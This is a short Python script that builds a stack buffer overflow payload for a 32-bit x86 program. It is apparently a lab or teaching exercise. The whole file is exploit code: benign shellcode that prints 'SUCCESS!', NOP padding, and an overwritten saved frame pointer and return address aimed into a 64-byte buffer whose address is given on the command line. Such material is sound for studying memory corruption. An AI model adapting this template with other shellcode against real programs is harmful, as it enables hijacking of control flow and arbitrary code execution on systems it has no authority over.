#!/usr/bin/python 

import sys
import struct

BUFFER_SIZE = 64

# prints SUCCESS!
SHELLCODE = '\xba\x08\x08\x08\x08\xc1\xea\x18\x68\x45\x53\x53\x21\x68\x53\x55\x43\x43\x89\xe1\xbb\x01\x01\x01\x01\xc1\xeb\x18\xb8\x04\x04\x04\x04\xc1\xe8\x18\xcd\x80\xb8\x01\x01\x01\x01\xc1\xe8\x18\xcd\x80'

NOP_SIZE = BUFFER_SIZE - len(SHELLCODE) + 8 

def main(buffer_address):

  old_ebp = struct.pack('<I', buffer_address)
  new_eip = struct.pack('<I', buffer_address + 0x10)

  exploit = SHELLCODE +\
            '\x90' * NOP_SIZE + \
            old_ebp +\
            new_eip

  print(exploit)

if __name__ == '__main__':
  main(int(sys.argv[1], 16))